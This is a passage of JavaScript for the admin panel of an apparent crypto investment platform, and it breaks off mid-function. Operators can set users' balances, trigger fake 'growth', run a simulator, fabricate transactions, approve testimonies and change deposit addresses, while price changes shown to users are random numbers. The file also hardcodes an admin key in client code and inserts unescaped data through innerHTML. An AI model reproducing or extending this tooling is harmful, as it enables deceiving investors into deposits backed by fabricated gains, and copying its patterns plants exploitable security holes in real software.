(function(){
  const apiBase = window.__apiBase || (window.location.hostname === 'localhost' ? 'http://localhost:5001/api' : '/api')
  const SYMBOL_MAP = window.SYMBOL_MAP || {}
  const MARKET_SYMBOLS = window.MARKET_SYMBOLS || Object.keys(SYMBOL_MAP).length > 0 ? Object.keys(SYMBOL_MAP) : ['BTC', 'ETH', 'SOL', 'ADA', 'DOGE', 'LINK', 'POLKADOT', 'USDT', 'USDC', 'BNB', 'XRP', 'CARDANO']

  // DOM elements
  const $id = id => document.getElementById(id)
  const tbodyEl = $id('holdings-tbody')
  const totalValueEl = $id('total-value')
  const portfolioBalanceEl = $id('portfolio-balance')
  const totalChangeEl = $id('total-change')
  const statChangeEl = $id('stat-change')
  const assetCountEl = $id('asset-count')
  const bestPerfEl = $id('best-perf')
  const worstPerfEl = $id('worst-perf')
  const breakdownEl = $id('breakdown-list')
  const modal = $id('asset-modal')
  const modalSymbol = $id('modal-symbol')
  const modalAmount = $id('modal-amount')
  const adminKeyEl = $id('admin-key-input')
  const adminVerifyBtn = $id('admin-verify-btn')
  const adminClearKeyBtn = $id('admin-clear-key')
  const adminParamsSection = $id('admin-params')
  const adminUserSelect = $id('admin-user-select')
  const adminLoadUserBtn = $id('admin-load-user')
  const adminSavePortfolioBtn = $id('admin-save-portfolio')
  const adminBalanceInput = $id('admin-balance')
  const adminSetBalanceBtn = $id('admin-set-balance')
  const adminRefreshUsersBtn = $id('admin-refresh-users')
  const adminUsersTbody = $id('admin-users-tbody')
  const adminUserPreview = $id('admin-user-preview')
  const previewUserName = $id('preview-user-name')
  const previewUserEmail = $id('preview-user-email')
  const previewUserBalance = $id('preview-user-balance')
  const previewUserHoldings = $id('preview-user-holdings')
  const previewLoadIntoMainBtn = $id('preview-load-into-main')
  const previewOpenModalBtn = $id('preview-open-modal')
  const btnAdd = $id('btn-add-asset')
  const btnRefresh = $id('btn-refresh')
  const btnModalAdd = $id('modal-add-btn')
  const btnModalCancel = $id('modal-cancel-btn')
  const modalOverlay = $id('modal-close')
  const sortSelect = $id('sort-select')
  const filterSelect = $id('filter-select')
  const adminPreviewText = $id('admin-preview-text')
  const adminTransactionsSection = $id('transactions-section')
  const adminRefreshTransactionsBtn = $id('admin-refresh-transactions')
  const adminAddTransactionBtn = $id('admin-add-transaction')
  const txFormPanel = $id('tx-form-panel')
  const txEditForm = $id('tx-edit-form')
  const txFormCancel = $id('tx-form-cancel')
  const txEditId = $id('tx-edit-id')
  const txEditUser = $id('tx-edit-user')
  const txEditType = $id('tx-edit-type')
  const txEditAmount = $id('tx-edit-amount')
  const txEditStatus = $id('tx-edit-status')
  const txEditDate = $id('tx-edit-date')
  const txEditMethod = $id('tx-edit-method')
  const adminAllTransactionsTbody = $id('admin-all-transactions-tbody')
  const adminDepositsTbody = $id('admin-deposits-tbody')
  const adminWithdrawalsTbody = $id('admin-withdrawals-tbody')
  const adminTradesTbody = $id('admin-trades-tbody')
  const adminTestimoniesSection = $id('testimonies-section')
  const adminTestimoniesTbody = $id('admin-testimonies-tbody')
  const adminRefreshTestimoniesBtn = $id('admin-refresh-testimonies')
  
  // New admin feature elements
  const creditAmountEl = $id('credit-amount')
  const creditCurrencyEl = $id('credit-currency')
  const creditAddBtn = $id('credit-add-btn')
  const setBalanceBtnNew = $id('set-balance-btn')
  const triggerGrowthBtn = $id('trigger-growth-btn')
  const triggerGrowthAllBtn = $id('trigger-growth-btn-all')
  const simStartBtn = $id('sim-start')
  const simPauseBtn = $id('sim-pause')
  const simStatusEl = $id('sim-status')
  const simNextEl = $id('sim-next')
  const depositAddrBTCEl = $id('deposit-address-BTC')
  const depositAddrETHEl = $id('deposit-address-ETH')
  const depositAddrUSDTEl = $id('deposit-address-USDT')
  const depositAddrUSDCEl = $id('deposit-address-USDC')
  const saveDepositAddressesBtn = $id('save-deposit-addresses')
  const promptMessageEl = $id('prompt-message')
  const promptUserIdsEl = $id('prompt-user-ids')
  const sendPromptBtn = $id('send-prompt-btn')

  // Message display function
  function showMessage(text, type = 'info') {
    const container = $id('message-container')
    const msg = document.createElement('div')
    msg.className = `message ${type}`
    msg.textContent = text
    container.appendChild(msg)
    
    setTimeout(() => {
      msg.style.opacity = '0'
      msg.style.transition = 'opacity 0.3s ease'
      setTimeout(() => msg.remove(), 300)
    }, 3000)
  }

  let holdings = []

  let allAssets = [...holdings]

  function fmtMoney(v) {
    if (v >= 1) return `$${v.toLocaleString(undefined, {maximumFractionDigits: 2})}`
    return `$${v.toFixed(6)}`
  }

  function fmtPct(v) {
    return `${v > 0 ? '+' : ''}${v.toFixed(2)}%`
  }

  function fmtShort(v) {
    if (v >= 1e6) return `$${(v / 1e6).toFixed(2)}M`
    if (v >= 1e3) return `$${(v / 1e3).toFixed(2)}K`
    return fmtMoney(v)
  }

  function randomChange() {
    return (Math.random() * 8 - 4)
  }

  function buildSymbolOptions() {
    modalSymbol.innerHTML = ''
    const symbols = (MARKET_SYMBOLS || ['BTC', 'ETH', 'SOL']).slice().sort()
    for (const s of symbols) {
      const opt = document.createElement('option')
      opt.value = s
      opt.textContent = s
      modalSymbol.appendChild(opt)
    }
  }

  // Admin helpers
  function getAdminKey(){
    const v = (adminKeyEl && adminKeyEl.value) || sessionStorage.getItem('adminKey') || ''
    return v
  }

  function saveAdminKeyToSession(){
    if(!adminKeyEl) return
    const v = adminKeyEl.value || ''
    if(v) sessionStorage.setItem('adminKey', v)
    else sessionStorage.removeItem('adminKey')
  }

  function verifyAdminKey(){
    if(!adminKeyEl || !adminKeyEl.value.trim()) {
      showMessage('Please enter an admin key', 'error')
      return
    }
    
    const enteredKey = adminKeyEl.value.trim()
    const validAdminKey = 'elonu_admin_key_251104'
    
    if(enteredKey !== validAdminKey) {
      showMessage('Invalid admin key', 'error')
      adminKeyEl.value = ''
      return
    }
    
    saveAdminKeyToSession()
    showMessage('✓ Admin key verified', 'success')
    if(adminParamsSection) adminParamsSection.style.display = 'block'
    if(adminKeyEl) adminKeyEl.style.opacity = '0.5'
    adminVerifyBtn.style.display = 'none'
    if(adminTransactionsSection) adminTransactionsSection.style.display = 'block'
    if(adminTestimoniesSection) adminTestimoniesSection.style.display = 'block'
    fetchUsers()
    fetchTransactions()
    if(adminTestimoniesSection) fetchTestimonies()
  }

  function clearAdminKey(){
    if(adminKeyEl) adminKeyEl.value = ''
    sessionStorage.removeItem('adminKey')
    if(adminParamsSection) adminParamsSection.style.display = 'none'
    if(adminTransactionsSection) adminTransactionsSection.style.display = 'none'
    if(adminTestimoniesSection) adminTestimoniesSection.style.display = 'none'
    adminVerifyBtn.style.display = 'block'
    if(adminKeyEl) adminKeyEl.style.opacity = '1'
    showMessage('Admin key cleared', 'info')
  }

  async function fetchUsers(){
    if(!adminUserSelect) return
    const key = getAdminKey()
    try{
      const res = await fetch(`${apiBase}/admin/pro/users-pro`, {headers: key? {'x-admin-key': key}: {}})
      if(!res.ok) throw new Error('failed')
      const data = await res.json()
      adminUserSelect.innerHTML = '<option value="">(select user)</option>'
      for(const u of data || []){
        const o = document.createElement('option')
        o.value = u.id
        o.textContent = u.email || u.username || (`${u.id}`)
        adminUserSelect.appendChild(o)
      }
      // also render admin users table in main UI
      if(typeof renderAdminUsersTable === 'function') renderAdminUsersTable(data || [])
    }catch(e){
      console.warn('fetchUsers failed',e)
    }
  }

  function renderAdminUsersTable(list){
    if(!adminUsersTbody) return
    adminUsersTbody.innerHTML = ''
    for(let i=0;i<list.length;i++){
      const u = list[i]
      const tr = document.createElement('tr')
      const id = u.id || u.user_id || u.uid || ''
      tr.innerHTML = `
        <td>${i+1}</td>
        <td>${u.username||u.name||id}</td>
        <td>${u.email||'—'}</td>
        <td>${u.balance!=null?('$'+Number(u.balance).toFixed(2)):'—'}</td>
        <td>
          <button class="btn-secondary admin-load" data-id="${id}">Load</button>
          <button class="btn-primary admin-preview" data-id="${id}">Preview</button>
        </td>
      `
      adminUsersTbody.appendChild(tr)
    }
  }

  async function loadUserPortfolio(){
    const uid = adminUserSelect && adminUserSelect.value
    const key = getAdminKey()
    if(!uid) return showMessage('Select a user', 'error')
    try{
      const res = await fetch(`${apiBase}/admin/pro/users/${uid}/portfolio`, {headers: key? {'x-admin-key': key}: {}})
      if(!res.ok) throw new Error('load portfolio failed')
      const data = await res.json()
      // data expected as { assets: { BTC: 1.2, ETH: 0.5 } }
      const assets = data.assets || {}
      holdings = Object.keys(assets).map(s=>({symbol:s, amount: assets[s]}))
      allAssets = [...holdings]
      await refreshPrices()
      render()
      showMessage('Loaded portfolio for user', 'success')
    }catch(e){
      console.warn('loadUserPortfolio failed',e)
      showMessage('Unable to load portfolio; check admin key', 'error')
    }
  }

  async function saveUserPortfolio(){
    const uid = adminUserSelect && adminUserSelect.value
    const key = getAdminKey()
    if(!uid) return showMessage('Select a user', 'error')
    // build assets map
    const assets = {}
    for(const h of holdings){ if(h.symbol) assets[h.symbol]=Number(h.amount||0) }
    try{
      const res = await fetch(`${apiBase}/admin/pro/users/${uid}/set-portfolio`, {
        method: 'POST',
        headers: Object.assign({'Content-Type':'application/json'}, key?{'x-admin-key': key}:{}),
        body: JSON.stringify({assets})
      })
      if(!res.ok) throw new Error('save failed')
      showMessage('Portfolio saved', 'success')
    }catch(e){
      console.warn('saveUserPortfolio failed',e)
      showMessage('Unable to save portfolio; check admin key', 'error')
    }
  }

  // Load user details for preview panel (basic profile + portfolio)
  async function loadUserPreview(uid){
    if(!uid) return
    const key = getAdminKey()
    try{
      let profile = null
      try{
        const r = await fetch(`${apiBase}/admin/pro/users/${uid}`, {headers: key?{'x-admin-key':key}: {}})
        if(r.ok) profile = await r.json()
      }catch(e){ /* ignore profile fetch errors for preview */ }
      const r2 = await fetch(`${apiBase}/admin/pro/users/${uid}/portfolio`, {headers: key?{'x-admin-key':key}: {}})
      const portfolio = r2.ok? await r2.json() : {assets:{}}
      const assets = portfolio.assets || {}
      if(previewUserName) previewUserName.textContent = profile? (profile.name||profile.email||('User '+uid)) : ('User '+uid)
      if(previewUserEmail) previewUserEmail.textContent = profile? (profile.email||'—') : '—'
      if(previewUserBalance) previewUserBalance.textContent = profile && profile.balance!=null? ('$'+Number(profile.balance).toFixed(2)) : '—'
      if(previewUserHoldings){
        previewUserHoldings.innerHTML = ''
        const keys = Object.keys(assets)
        if(!keys.length) previewUserHoldings.textContent = 'No holdings'
        for(const s of keys){
          const row = document.createElement('div')
          row.style.display = 'flex'
          row.style.justifyContent = 'space-between'
          row.style.padding = '6px 0'
          row.innerHTML = `<div>${s}</div><div>${assets[s]}</div>`
          previewUserHoldings.appendChild(row)
        }
      }
      if(adminUserPreview) adminUserPreview.style.display = 'block'
      if(adminUserPreview) adminUserPreview.dataset.uid = uid
      const userName = profile? (profile.name||profile.email||('User '+uid)) : ('User '+uid)
      if(adminPreviewText) adminPreviewText.textContent = `Admin preview for user ${userName}`
    }catch(e){
      console.warn('loadUserPreview failed',e)
      showMessage('Unable to load user preview', 'error')
    }
  }

  async function setUserBalance(){
    const uid = adminUserSelect && adminUserSelect.value
    const key = getAdminKey()
    const bal = Number(adminBalanceInput && adminBalanceInput.value)
    if(!uid) return showMessage('Select a user', 'error')
    if(isNaN(bal)) return showMessage('Enter a valid balance', 'error')
    try{
      const res = await fetch(`${apiBase}/admin/pro/users/${uid}/set-balance`, {
        method: 'POST',
        headers: Object.assign({'Content-Type':'application/json'}, key?{'x-admin-key': key}:{}),
        body: JSON.stringify({balance: bal})
      })
      if(!res.ok) throw new Error('set balance failed')
      showMessage('Balance updated', 'success')
    }catch(e){
      console.warn('setUserBalance failed',e)
      showMessage('Unable to set balance; check admin key', 'error')
    }
  }

  // Transactions admin panel
  let allTransactions = []

  async function fetchTransactions() {
    const key = getAdminKey()
    try {
      const res = await fetch(`${apiBase}/admin/pro/transactions`, {headers: key ? {'x-admin-key': key} : {}})
      if(!res.ok) throw new Error('fetch transactions failed')
      allTransactions = await res.json()
      renderAllTransactionTabs()
    } catch(e) {
      console.warn('fetchTransactions failed', e)
      showMessage('Unable to load transactions', 'error')
    }
  }

  function renderAllTransactionTabs() {
    // All transactions
    if(adminAllTransactionsTbody) {
      adminAllTransactionsTbody.innerHTML = ''
      allTransactions.forEach((t, idx) => {
        const row = document.createElement('tr')
        row.innerHTML = `
          <td>${t.id || idx + 1}</td>
          <td>${t.user || '—'}</td>
          <td><span style="padding:2px 6px;border-radius:4px;font-size:11px;background:${getTypeColor(t.type)};color:white">${t.type || 'transfer'}</span></td>
          <td>${fmtMoney(t.amount || 0)}</td>
          <td>${t.date ? new Date(t.date).toLocaleDateString() : '—'}</td>
          <td><span style="font-size:12px">${t.status || 'pending'}</span></td>
          <td><button class="btn-edit" data-tx-id="${t.id || idx}" style="padding:4px 8px;font-size:12px">Edit</button> <button class="btn-remove" data-tx-id="${t.id || idx}" style="padding:4px 8px;font-size:12px">Delete</button></td>
        `
        adminAllTransactionsTbody.appendChild(row)
      })
    }

    // Deposits
    const deposits = allTransactions.filter(t => t.type === 'deposit')
    if(adminDepositsTbody) {
      adminDepositsTbody.innerHTML = ''
      deposits.forEach((t, idx) => {
        const row = document.createElement('tr')
        row.innerHTML = `
          <td>${t.date ? new Date(t.date).toLocaleDateString() : '—'}</td>
          <td>${t.user || '—'}</td>
          <td>${t.method || '—'}</td>
          <td>${fmtMoney(t.amount || 0)}</td>
          <td><span style="font-size:12px">${t.status || 'pending'}</span></td>
          <td>${t.txid || '—'}</td>
          <td><button class="btn-edit" data-tx-id="${t.id || idx}" style="padding:4px 8px;font-size:12px">Edit</button></td>
        `
        adminDepositsTbody.appendChild(row)
      })
    }

    // Withdrawals
    const withdrawals = allTransactions.filter(t => t.type === 'withdrawal')
    if(adminWithdrawalsTbody) {
      adminWithdrawalsTbody.innerHTML = ''
      withdrawals.forEach((t, idx) => {
        const row = document.createElement('tr')
        row.innerHTML = `
          <td>${t.date ? new Date(t.date).toLocaleDateString() : '—'}</td>
          <td>${t.user || '—'}</td>
          <td>${t.method || '—'}</td>
          <td>${fmtMoney(t.amount || 0)}</td>
          <td><span style="font-size:12px">${t.status || 'pending'}</span></td>
          <td>${t.txid || '—'}</td>
          <td><button class="btn-edit" data-tx-id="${t.id || idx}" style="padding:4px 8px;font-size:12px">Edit</button></td>
        `
        adminWithdrawalsTbody.appendChild(row)
      })
    }

    // Trades
    const trades = allTransactions.filter(t => t.type === 'trade')
    if(adminTradesTbody) {
      adminTradesTbody.innerHTML = ''
      trades.forEach((t, idx) => {
        const row = document.createElement('tr')
        row.innerHTML = `
          <td>${t.date ? new Date(t.date).toLocaleDateString() : '—'}</td>
          <td>${t.user || '—'}</td>
          <td>${t.side || 'buy'}</td>
          <td>${t.asset || '—'}</td>
          <td>${t.amount || 0}</td>
          <td>${fmtMoney(t.price || 0)}</td>
          <td>${fmtMoney((t.amount || 0) * (t.price || 0))}</td>
          <td><button class="btn-edit" data-tx-id="${t.id || idx}" style="padding:4px 8px;font-size:12px">Edit</button></td>
        `
        adminTradesTbody.appendChild(row)
      })
    }
  }

  function getTypeColor(type) {
    const colors = {
      'deposit': '#10b981',
      'withdrawal': '#f59e0b',
      'trade': '#2563eb'
    }
    return colors[type] || '#6b7280'
  }

  function openTxForm(txId = null) {
    if(txId !== null && txId !== undefined) {
      const tx = allTransactions.find(t => t.id === txId || allTransactions.indexOf(t) === txId)
      if(tx) {
        txEditId.value = tx.id || ''
        txEditUser.value = tx.user || ''
        txEditType.value = tx.type || 'deposit'
        txEditAmount.value = tx.amount || ''
        txEditStatus.value = tx.status || 'pending'
        txEditDate.value = tx.date ? new Date(tx.date).toISOString().slice(0, 16) : ''
        txEditMethod.value = tx.method || tx.asset || ''
      }
    } else {
      txEditForm.reset()
      txEditId.value = ''
    }
    txFormPanel.style.display = 'block'
  }

  function closeTxForm() {
    txFormPanel.style.display = 'none'
    txEditForm.reset()
  }

  async function saveTransaction(e) {
    e.preventDefault()
    const key = getAdminKey()
    if(!key) return showMessage('Admin key required', 'error')

    const tx = {
      user: txEditUser.value,
      type: txEditType.value,
      amount: parseFloat(txEditAmount.value),
      status: txEditStatus.value,
      method: txEditMethod.value
    }

    // Only include date if it was explicitly set
    if (txEditDate.value && txEditDate.value.trim()) {
      tx.date = txEditDate.value;
    }

    // Validate required fields
    if (!tx.user || isNaN(tx.amount)) {
      return showMessage('Please fill in all required fields', 'error')
    }

    try {
      const res = await fetch(`${apiBase}/admin/pro/transactions`, {
        method: 'POST',
        headers: {'Content-Type': 'application/json', 'x-admin-key': key},
        body: JSON.stringify(tx)
      })
      const j = await res.json()
      if(!res.ok) {
        console.warn('saveTransaction failed:', j)
        return showMessage(j.error || 'Failed to save transaction', 'error')
      }
      showMessage('Transaction created successfully', 'success')
      closeTxForm()
      fetchTransactions()
    } catch(e) {
      console.warn('saveTransaction failed', e)
      showMessage('Unable to save transaction: ' + (e.message || e), 'error')
    }
  }

  // Testimonies admin panel
  async function fetchTestimonies() {
    const key = getAdminKey()
    try {
      const res = await fetch(`${apiBase}/admin/pro/testimonies`, {headers: key ? {'x-admin-key': key} : {}})
      if(!res.ok) throw new Error('fetch testimonies failed')
      const testimonies = await res.json()
      const data = Array.isArray(testimonies) ? testimonies : (testimonies && testimonies.testimonies) || []
      renderAdminTestimoniesTable(data)
    } catch(e) {
      console.warn('fetchTestimonies failed', e)
    }
  }

  function renderAdminTestimoniesTable(testimonies = []) {
    if (!adminTestimoniesTbody) return
    adminTestimoniesTbody.innerHTML = ''
    testimonies.forEach((t, idx) => {
      const row = document.createElement('tr')
      const status = t.approved ? 'Approved' : 'Pending'
      const statusColor = t.approved ? '#d1fae5' : '#fef08a'
      const statusTextColor = t.approved ? '#047857' : '#92400e'
      row.innerHTML = `
        <td>${t.id || idx + 1}</td>
        <td>${t.user || '—'}</td>
        <td>${(t.message || '—').substring(0, 40)}${(t.message || '').length > 40 ? '...' : ''}</td>
        <td><span style="padding:2px 8px;border-radius:4px;font-size:12px;background:${statusColor};color:${statusTextColor}">${status}</span></td>
        <td>
          ${!t.approved ? `<button class="btn-approve" data-testimony-id="${t.id}" style="margin-right:4px">Approve</button>` : ''}
          <button class="btn-remove" data-testimony-id="${t.id}">Delete</button>
        </td>
      `
      adminTestimoniesTbody.appendChild(row)
    })
  }

  async function refreshPrices() {
    const needed = [...new Set(holdings.map(h => h.symbol).filter(Boolean))]
    if (!needed.length) {
      holdings.forEach(h => {
        h.price = h.price || 0
        h.value = (h.price || 0) * (h.amount || 0)
        h.change = randomChange()
      })
      return true
    }

    const ids = needed.map(s => (SYMBOL_MAP[s] && SYMBOL_MAP[s].id) || s.toLowerCase())
    try {
      const res = await fetch(`${apiBase}/prices?symbols=${ids.join(',')}`)
      if (!res.ok) throw new Error('price fetch failed')
      const data = await res.json()

      const idToUsd = {}
      for (const id of Object.keys(data || {})) {
        idToUsd[id] = data[id].usd
      }

      for (const h of holdings) {
        const id = (SYMBOL_MAP[h.symbol] && SYMBOL_MAP[h.symbol].id) || h.symbol.toLowerCase()
        h.price = idToUsd[id] || h.price || 0
        h.value = (h.price || 0) * (h.amount || 0)
        h.change = randomChange()
      }

      return true
    } catch (e) {
      console.warn('price refresh failed', e)
      holdings.forEach(h => {
        h.price = h.price || 0
        h.value = (h.price || 0) * (h.amount || 0)
        h.change = randomChange()
      })
      return false
    }
  }

  function render() {
    tbodyEl.innerHTML = ''

    // Compute allocations
    const totalPortfolio = holdings.reduce((s, a) => s + (a.value || 0), 0)
    for (const h of holdings) {
      h.allocation = totalPortfolio > 0 ? Math.round((h.value / totalPortfolio) * 100) : 0
    }

    // Apply sorting
    let sorted = [...holdings]
    if (sortSelect && sortSelect.value === 'change') {
      sorted.sort((a, b) => (b.change || 0) - (a.change || 0))
    } else if (sortSelect && sortSelect.value === 'symbol') {
      sorted.sort((a, b) => a.symbol.localeCompare(b.symbol))
    } else {
      sorted.sort((a, b) => (b.value || 0) - (a.value || 0))
    }

    // Apply filtering
    let filtered = sorted
    if (filterSelect && filterSelect.value === 'gainers') {
      filtered = sorted.filter(a => (a.change || 0) > 0)
    } else if (filterSelect && filterSelect.value === 'losers') {
      filtered = sorted.filter(a => (a.change || 0) < 0)
    }

    // Render rows
    for (let i = 0; i < filtered.length; i++) {
      const h = filtered[i]
      const tr = document.createElement('tr')

      const changeClass = (h.change || 0) >= 0 ? 'positive' : 'negative'

      tr.innerHTML = `
        <td class="col-rank">${i + 1}</td>
        <td class="col-asset">
          <div class="asset-badge">
            <div class="asset-icon">${h.symbol.slice(0, 1)}</div>
            <div class="asset-names">
              <div class="asset-name">${h.symbol}</div>
              <div class="asset-symbol">${h.symbol}</div>
            </div>
          </div>
        </td>
        <td class="col-price">${h.price ? fmtMoney(h.price) : '--'}</td>
        <td class="col-change"><span class="price-change ${changeClass}">${h.change != null ? fmtPct(h.change) : '--'}</span></td>
        <td class="col-holdings">${h.amount ? h.amount.toFixed(4) : '0'}</td>
        <td class="col-value">${h.value ? fmtShort(h.value) : '--'}</td>
        <td class="col-alloc">
          <div class="alloc-bar">
            <div class="alloc-fill" style="width: ${h.allocation || 0}%"></div>
          </div>
          <span>${h.allocation || 0}%</span>
        </td>
        <td class="col-actions">
          <button class="btn-remove" data-symbol="${h.symbol}">Remove</button>
        </td>
      `
      tbodyEl.appendChild(tr)
    }

    // Update summary stats
    const total = holdings.reduce((s, a) => s + (a.value || 0), 0)
    totalValueEl.textContent = fmtMoney(total)
    if(portfolioBalanceEl) portfolioBalanceEl.textContent = fmtMoney(total)
    assetCountEl.textContent = holdings.length

    const avgChange = holdings.length > 0 ? holdings.reduce((s, a) => s + (a.change || 0), 0) / holdings.length : 0
    totalChangeEl.textContent = fmtPct(avgChange)
    statChangeEl.textContent = fmtPct(avgChange)
    statChangeEl.style.color = avgChange >= 0 ? '#10b981' : '#ef4444'

    // Best/Worst performers
    if (holdings.length > 0) {
      const best = holdings.reduce((a, b) => ((b.change || 0) > (a.change || 0)) ? b : a)
      const worst = holdings.reduce((a, b) => ((b.change || 0) < (a.change || 0)) ? b : a)
      bestPerfEl.textContent = `${best.symbol} ${fmtPct(best.change || 0)}`
      worstPerfEl.textContent = `${worst.symbol} ${fmtPct(worst.change || 0)}`
    }

    // Portfolio breakdown (right panel)
    renderBreakdown()
  }

  function renderBreakdown() {
    breakdownEl.innerHTML = ''
    const sorted = [...holdings].sort((a, b) => (b.value || 0) - (a.value || 0))
    const total = holdings.reduce((s, a) => s + (a.value || 0), 0)

    for (const h of sorted) {
      const pct = total > 0 ? Math.round((h.value / total) * 100) : 0
      const item = document.createElement('div')
      item.className = 'breakdown-item'
      item.innerHTML = `
        <span class="breakdown-coin">${h.symbol}</span>
        <span class="breakdown-pct">${pct}%</span>
      `
      breakdownEl.appendChild(item)
    }
  }

  function openModal() {
    buildSymbolOptions()
    modal.classList.remove('hidden')
    modalAmount.value = ''
    modalSymbol.focus()
  }

  function closeModal() {
    modal.classList.add('hidden')
  }

  function addHolding(symbol, amount) {
    const existing = holdings.find(h => h.symbol === symbol)
    if (existing) {
      existing.amount += Number(amount)
    } else {
      holdings.push({symbol, amount: Number(amount)})
    }
    refreshPrices().then(render)
  }

  // Event listeners
  btnAdd && btnAdd.addEventListener('click', openModal)
  btnRefresh && btnRefresh.addEventListener('click', () => {
    refreshPrices().then(render)
  })
  btnModalCancel && btnModalCancel.addEventListener('click', closeModal)
  modalOverlay && modalOverlay.addEventListener('click', closeModal)
  btnModalAdd && btnModalAdd.addEventListener('click', () => {
    const sym = modalSymbol.value
    const amt = modalAmount.value || 0
    if (sym && Number(amt) > 0) {
      addHolding(sym, amt)
      closeModal()
    } else {
      showMessage('Please select a coin and enter a valid amount', 'error')
    }
  })

  // admin events
  adminKeyEl && adminKeyEl.addEventListener('change', ()=>{ 
    saveAdminKeyToSession()
    const adminSection = $id('admin-section')
    const transactionsSection = $id('transactions-section')
    const testimoniesSection = $id('testimonies-section')
    if(adminSection && adminKeyEl.value.trim()) {
      adminSection.style.display = 'block'
      if(transactionsSection) transactionsSection.style.display = 'block'
      if(testimoniesSection) testimoniesSection.style.display = 'block'
      fetchUsers()
      fetchTransactions()
      fetchTestimonies()
    } else if(adminSection) {
      adminSection.style.display = 'none'
      if(transactionsSection) transactionsSection.style.display = 'none'
      if(testimoniesSection) testimoniesSection.style.display = 'none'
    }
  })
  adminLoadUserBtn && adminLoadUserBtn.addEventListener('click', ()=>{ loadUserPortfolio() })
  adminSavePortfolioBtn && adminSavePortfolioBtn.addEventListener('click', ()=>{ saveUserPortfolio() })
  adminSetBalanceBtn && adminSetBalanceBtn.addEventListener('click', ()=>{ setUserBalance() })
  setBalanceBtnNew && setBalanceBtnNew.addEventListener('click', ()=>{ setUserBalance() })
  creditAddBtn && creditAddBtn.addEventListener('click', ()=>{
    const uid = adminUserSelect && adminUserSelect.value
    const amount = creditAmountEl && creditAmountEl.value
    const currency = creditCurrencyEl && creditCurrencyEl.value
    if(!uid) return showMessage('Select a user', 'error')
    if(!amount) return showMessage('Enter amount', 'error')
    const key = getAdminKey()
    if(!key) return showMessage('Admin key required', 'error')
    fetch(`${apiBase}/admin/users/${uid}/credit`, {
      method: 'POST',
      headers: {'Content-Type':'application/json', 'x-admin-key':key},
      body: JSON.stringify({amount: parseFloat(amount), currency})
    })
      .then(r => r.ok ? Promise.resolve() : Promise.reject())
      .then(() => { showMessage(`✓ Credited $${amount} ${currency}`, 'success'); creditAmountEl.value = ''; loadUserPortfolio() })
      .catch(() => showMessage('Unable to credit', 'error'))
  })
  triggerGrowthBtn && triggerGrowthBtn.addEventListener('click', ()=>{
    const uid = adminUserSelect && adminUserSelect.value
    if(!uid) return showMessage('Select a user', 'error')
    const key = getAdminKey()
    if(!key) return showMessage('Admin key required', 'error')
    fetch(`${apiBase}/admin/users/${uid}/trigger-growth`, {
      method: 'POST',
      headers: {'x-admin-key':key}
    })
      .then(r => r.ok ? Promise.resolve() : Promise.reject())
      .then(() => { showMessage('✓ Growth triggered', 'success'); loadUserPortfolio() })
      .catch(() => showMessage('Unable to trigger growth', 'error'))
  })
  triggerGrowthAllBtn && triggerGrowthAllBtn.addEventListener('click', ()=>{
    const key = getAdminKey()
    if(!key) return showMessage('Admin key required', 'error')
    fetch(`${apiBase}/admin/trigger-growth-all`, {
      method: 'POST',
      headers: {'x-admin-key':key}
    })
      .then(r => r.ok ? Promise.resolve() : Promise.reject())
      .then(() => { showMessage('✓ Growth triggered for all users', 'success') })
      .catch(() => showMessage('Unable to trigger growth', 'error'))
  })
  saveDepositAddressesBtn && saveDepositAddressesBtn.addEventListener('click', ()=>{
    const key = getAdminKey()
    if(!key) return showMessage('Admin key required', 'error')
    const addresses = {
      BTC: depositAddrBTCEl.value,
      ETH: depositAddrETHEl.value,
      USDT: depositAddrUSDTEl.value,
      USDC: depositAddrUSDCEl.value
    }
    fetch(`${apiBase}/admin/deposit-addresses`, {
      method: 'POST',
      headers: {'Content-Type':'application/json', 'x-admin-key':key},
      body: JSON.stringify(addresses)
    })
      .then(r => r.ok ? Promise.resolve() : Promise.reject())
      .then(() => showMessage('✓ Deposit addresses saved', 'success'))
      .catch(() => showMessage('Unable to save addresses', 'error'))
  })
  sendPromptBtn && sendPromptBtn.addEventListener('click', ()=>{
    const msg = promptMessageEl && promptMessageEl.value
    const userIds = promptUserIdsEl && promptUserIdsEl.value
    if(!msg) return showMessage('Enter message', 'error')
    const key = getAdminKey()
    if(!key) return showMessage('Admin key required', 'error')
    fetch(`${apiBase}/admin/prompts`, {
      method: 'POST',
      headers: {'Content-Type':'application/json', 'x-admin-key':key},
      body: JSON.stringify({message: msg, userIds: userIds ? userIds.split(',').map(x => parseInt(x.trim(), 10)).filter(n => !isNaN(n)) : null})
    })
      .then(r => r.ok ? Promise.resolve() : Promise.reject())
      .then(() => { showMessage('✓ Prompt sent', 'success'); promptMessageEl.value = ''; promptUserIdsEl.value = '' })
      .catch(() => showMessage('Unable to send prompt', 'error'))
  })
  simStartBtn && simStartBtn.addEventListener('click', ()=>{
    const key = getAdminKey()
    if(!key) return showMessage('Admin key required', 'error')
    fetch(`${apiBase}/admin/simulator/start`, {
      method: 'POST',
      headers: {'x-admin-key':key}
    })
      .then(r => r.ok ? Promise.resolve() : Promise.reject())
      .then(() => { showMessage('✓ Simulator started', 'success'); if(simStatusEl) simStatusEl.textContent = 'Running' })
      .catch(() => showMessage('Unable to start simulator', 'error'))
  })
  simPauseBtn && simPauseBtn.addEventListener('click', ()=>{
    const key = getAdminKey()
    if(!key) return showMessage('Admin key required', 'error')
    fetch(`${apiBase}/admin/simulator/pause`, {
      method: 'POST',
      headers: {'x-admin-key':key}
    })
      .then(r => r.ok ? Promise.resolve() : Promise.reject())
      .then(() => { showMessage('✓ Simulator paused', 'success'); if(simStatusEl) simStatusEl.textContent = 'Paused' })
      .catch(() => showMessage('Unable to pause simulator', 'error'))
  })
  adminVerifyBtn && adminVerifyBtn.addEventListener('click', verifyAdminKey)
  adminClearKeyBtn && adminClearKeyBtn.addEventListener('click', clearAdminKey)
  adminKeyEl && adminKeyEl.addEventListener('keypress', (e) => { if(e.key === 'Enter') verifyAdminKey() })
  adminRefreshTransactionsBtn && adminRefreshTransactionsBtn.addEventListener('click', ()=>{ fetchTransactions() })
  adminRefreshTestimoniesBtn && adminRefreshTestimoniesBtn.addEventListener('click', ()=>{ fetchTestimonies() })
  adminAddTransactionBtn && adminAddTransactionBtn.addEventListener('click', ()=>{ openTxForm() })
  txFormCancel && txFormCancel.addEventListener('click', closeTxForm)
  txEditForm && txEditForm.addEventListener('submit', saveTransaction)

  // Transaction tab switching
  document.querySelectorAll('.transaction-tab').forEach(btn => {
    btn.addEventListener('click', (e) => {
      document.querySelectorAll('.transaction-tab').forEach(b => b.classList.remove('active'))
